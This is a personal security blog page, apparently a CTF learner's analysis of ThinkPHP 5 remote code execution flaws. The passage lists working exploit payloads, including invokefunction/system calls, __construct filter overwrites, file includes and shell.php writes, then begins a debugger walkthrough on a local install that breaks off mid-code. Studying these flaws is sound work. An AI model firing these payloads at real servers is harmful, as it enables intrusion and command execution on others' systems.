@@ -1,0 +1,1179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Saofe1a">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/10/07/thinkphp5--rce/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="thinkphp5最出名的就是rce，rce有两个大版本的区别  ThinkPHP 5.0.0-5.0.24 ThinkPHP 5.1.0-5.1.30  RCE payload总结因为漏洞具体触发点和版本的不同，导致payload分为了很多种，总体来看依然分两大种：  直接访问路由触发，由于未开启强制路由，且Request类在兼容模式下获取的控制器没有进行合法校验导致的rce   5.1.x ：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp5 RCE">
+<meta property="og:url" content="http://example.com/2024/10/07/Thinkphp5--RCE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="thinkphp5最出名的就是rce，rce有两个大版本的区别  ThinkPHP 5.0.0-5.0.24 ThinkPHP 5.1.0-5.1.30  RCE payload总结因为漏洞具体触发点和版本的不同，导致payload分为了很多种，总体来看依然分两大种：  直接访问路由触发，由于未开启强制路由，且Request类在兼容模式下获取的控制器没有进行合法校验导致的rce   5.1.x ：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-25496a5985e9e3dc561a1255ff351c1f_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-50704ebe8c844374abeddef9fdefc4d5_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-4dbf3773562e7a662b151cfd17b14252_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-f0207c5586de9d0f4df428b905d678d9_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-555b8637ef2b1538f7ead7a35c20ead6_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-3539196cc6cf16484d383553de34bc59_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-844912a074ee9d5cc5a8f49302967123_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-6ebc9c5d0bd749884de0ac77ef0c5a3b_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-9832a6b6d843d832569cff71b110a177_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-48ae98ca30cccf2b26e2e81c890512b0_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-ee343dc51cad30f5b09113dbd84f943a_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-a288cde1e8d9fda8a6ba1843107b9c36_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-d8a57edc7ad96123b190a3b874660bb8_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-17ab660b337d156453e1b4bc5dcd11b3_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-f7a9b1a4da8eba316fea4e76dd3286fa_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-e218a4e56d7ed8873288c3449e83edd8_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-b3e3cd2aaad2cbc42e8694440c5a4fae_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-8e187ac547b12f1fc32349137512a815_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-a1ef6d862e488751569613365304defd_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-9d6c1044816b58bd38d9326bd468e3a5_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-90b3bae01f822b1b22f6eeedc75d349b_1440w.webp">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-cddcbd34235e214dd088a041a56cc1e5_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-aef35647b27562c1a46aeba598a0d370_1440w.webp">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-f51362104e6aa23d77ada4162373988a_1440w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-648b9fcd572b54c4fc8d1e48610ed1b4_1440w.webp">
+<meta property="article:published_time" content="2024-10-07T13:08:48.734Z">
+<meta property="article:modified_time" content="2024-10-07T13:08:12.300Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic2.zhimg.com/80/v2-25496a5985e9e3dc561a1255ff351c1f_1440w.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/chelsea.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/chelsea.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/chelsea.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Thinkphp5 RCE -
+        
+        Saofe1a
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Saofe1a","subtitle":{"text":["Better late than never","感谢所有在CTF道路上帮助过我的师傅们","Man proposes,God disposes"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"About":{"path":"/about/","icon":"fa-regular fa-user"},"Links":{"path":"/links/","icon":"fa-regular fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Saofe1a
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Saofe1a
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    LINKS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                LINKS
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Thinkphp5 RCE</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/touxiang.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Saofe1a</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-10-07 21:08:48</span>
+        <span class="mobile">2024-10-07 21:08:48</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-10-07 21:08:12</span>
+            <span class="mobile">2024-10-07 21:08:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>10 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>thinkphp5最出名的就是rce，rce有两个大版本的区别</p>
+<ol>
+<li>ThinkPHP 5.0.0-5.0.24</li>
+<li>ThinkPHP 5.1.0-5.1.30</li>
+</ol>
+<h1 id="RCE-payload总结"><a href="#RCE-payload总结" class="headerlink" title="RCE payload总结"></a>RCE payload总结</h1><p>因为漏洞具体触发点和版本的不同，导致payload分为了很多种，总体来看依然分两大种：</p>
+<ol>
+<li>直接访问路由触发，由于未开启强制路由，且Request类在兼容模式下获取的控制器没有进行合法校验导致的rce</li>
+</ol>
+<p> 5.1.x ：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\Request/input&amp;filter[]=system&amp;data=pwd  </span><br><span class="line">?s=index/think\view\driver\Php/display&amp;content=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>  </span><br><span class="line">?s=index/think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>  </span><br><span class="line">?s=index/think\Container/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">id</span>  </span></span><br><span class="line"><span class="function">?<span class="title">s</span>=<span class="title">index</span>/<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">id</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>5.0.x ：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username <span class="comment"># 获取配置信息  </span></span><br><span class="line">?s=index/think\Lang/load&amp;file=../../test.jpg    <span class="comment"># 包含任意文件  </span></span><br><span class="line">?s=index/think\Config/load&amp;file=../../t.php     <span class="comment"># 包含任意.php文件  </span></span><br><span class="line">?s=index/think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">id</span>  </span></span><br><span class="line"><span class="function">?<span class="title">s</span>=<span class="title">index</span>|<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][0]=<span class="title">whoami</span></span></span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li>另一种是因为Request类的<code>method</code>和<code>__construct</code>方法造成的<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//php.local/thinkphp5.0.5/public/index.php?s=index</span></span><br><span class="line"></span><br><span class="line">post  </span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo  </span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.13  </span></span><br><span class="line">POST /?s=index/index  </span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug  </span></span><br><span class="line">POST /  </span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha  </span></span><br><span class="line">POST /?s=xxx HTTP/<span class="number">1.1</span>  </span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al  </span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>具体使用payload的时候可以多试几条。</p>
+<h1 id="method任意调用方法导致rce"><a href="#method任意调用方法导致rce" class="headerlink" title="method任意调用方法导致rce"></a>method任意调用方法导致rce</h1><p>在apache根目录composer安装</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp 5.0.22</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="开启debug模式"><a href="#开启debug模式" class="headerlink" title="开启debug模式"></a>开启debug模式</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>打开application&#x2F;config.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 其他配置...</span></span><br><span class="line">    <span class="string">&#x27;app_debug&#x27;</span> =&gt; <span class="literal">true</span>, <span class="comment">// 开启调试模式</span></span><br><span class="line">    <span class="string">&#x27;trace&#x27;</span>     =&gt; <span class="literal">true</span>, <span class="comment">// 开启页面Trace</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><p><code>GET:http://localhost:8888/tp/public/ </code>POST:_method&#x3D;__construct&amp;filter&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;whoami&#96;</p>
+<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>咱们debug之前先看看Request.php中的关键方法<br><code>__construct</code>在控制options的情况下可以实现对类中变量的覆盖<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-25496a5985e9e3dc561a1255ff351c1f_1440w.webp"
+                     
+                ></p>
+<p>method方法，可以实现任意request类中方法的调用，其中这个<code>$this-&gt;&#123;$this-&gt;method&#125;($_POST)</code>可以通过<code>var_method</code>改变，<code>var_method</code>可以通过POST传入<code>_method</code>来改变。于是自然想到可以传入<code>_method</code>&#x3D;<br><code>__construct</code>来进行变量覆盖<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-50704ebe8c844374abeddef9fdefc4d5_1440w.webp"
+                     
+                ></p>
+<p>filterValue方法，只要我们控制了value和filter的值，<code>call_user_func($filter, $value)</code>就可以实现任意方法的调用<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-4dbf3773562e7a662b151cfd17b14252_1440w.webp"
+                     
+                ></p>
+<p>接下来步入正题，打上断点跟着走，入口在public&#x2F;index.php<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-f0207c5586de9d0f4df428b905d678d9_1440w.webp"
+                     
+                ></p>
+<p>会引入框架的<code>start.php</code>，再跳到<code>run()</code>方法</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request <span class="variable">$request</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...省略...</span><br><span class="line">        <span class="comment">// 获取应用调度信息</span></span><br><span class="line">        <span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="variable">$dispatch</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span 